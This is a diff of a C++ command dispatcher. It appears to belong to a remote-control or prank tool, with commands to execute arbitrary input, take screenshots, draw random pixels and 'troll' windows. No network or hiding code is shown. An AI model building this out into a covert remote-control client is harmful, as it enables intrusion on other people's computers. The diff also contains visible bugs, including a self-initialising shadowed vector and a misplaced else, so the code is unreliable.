+++ src/Commands/CommandHandler.cpp
@@ -1,71 +1,98 @@
 #include "CommandHandler.h"
 
-std::vector<std::string> CommandHandler::cleanFunctions(const std::string& input)
+CommandHandler::CommandHandler()
 {
-    std::vector<std::string> result;
-    std::istringstream iss(input);
+    std::cout << "[Command Handler] [+] Created instance!\n";
+}
+
+CommandHandler::~CommandHandler()
+{
+    std::cout << "[Command Handler] [+] Destroyed instance!\n";
+}
+
+void CommandHandler::setInput(std::string input)
+{
+    rawInput = input;
+}
+
+void CommandHandler::clean()
+{
+    std::cout << "[Command Handler] [+] Cleaning input!\n";
+    std::istringstream iss(rawInput);
     std::string token;
 
     while (std::getline(iss, token, '\''))
     {
-        if (!token.empty() && token != " ")
+        token.erase(std::remove_if(token.begin(), token.end(), ::isspace), token.end());
+
+        if (!token.empty())
         {
-            result.push_back(token);
+            std::cout << "[Command Handler :: clean()] [~] Token: " << token << "\n";
+            args.push_back(token);
         }
     }
-
-    return result;
+    //std::cout << args[0] << "A" << args[1] << "\n";
 }
 
-void CommandHandler::callFunction(const std::vector<std::string>& input)
+void CommandHandler::callFunction()
 {
-    //std::cout << "DEBUG: " << input[0] << "SPACE\n";
-    std::cout << "[+] Called callFunction() with args -> ";
-    for(int i = 0; i < input.size(); i++)
-    {
-        std::cout << input[i] << " ";
-    }
-    std::cout << "\n";
+    clean();
+    std::cout << "[Command Handler] [+] Calling function!\n";
 
-    if (input[0] == "Message ")
+    if (args[0] == "Message")
     {
-        std::vector<std::string> args = {input[1], input[2]};
+        std::vector<std::string> args = {args[1], args[2]};
         std::thread t(commands::showMessageBox, std::ref(args));
         t.detach();
     }
 
-    if (input[0] == "Execute ")
+    if (args[0] == "Execute")
     {
-        std::thread t(commands::execute, std::ref(input[1]));
+        std::thread t(commands::execute, std::ref(args[1]));
         t.detach();
     }
 
-    if (input[0] == "Cringe ")
+    if (args[0] == "Cringe")
     {
         std::thread t(commands::cringe);
         t.detach();
     }
 
-    if (input[0] == "screentest ")
+    if (args[0] == "screentest")
     {
         std::thread t(commands::Screenshot_C);
         t.detach();
     }
     
-    if(input[0] == "randomPixel ")
+    if(args[0] == "randomPixel")
     {
-        std::thread t(commands::randomPixel, std::stoi(input[1]), std::stoi(input[2]), 50);
+        std::thread t(commands::randomPixel, std::stoi(args[1]), std::stoi(args[2]), 10);
         t.detach();
     }
 
-    if(input[0] == "WindowTroll ")
+    if(args[0] == "WindowTroll")
     {
         std::thread t(commands::WindowTroll);
         t.detach();
     }
 
-    if(input[0] == "Exit ")
+    if(args[0] == "Exit")
     {
         commands::StopProcess();
+    } else {
+        std::cout << "[Command Handler] [!] Command not found!\n";
+    }
+}
+
+void CommandHandler::DebugPrint()
+{
+    if(Debug)
+    {
+        std::cout << "[+] Called  with args -> ";
+        for(int i = 0; i < static_cast<int>(args.size()); i++)
+        {
+            std::cout << args[i] << " ";
+        }
+        std::cout << "\n";
     }
 }
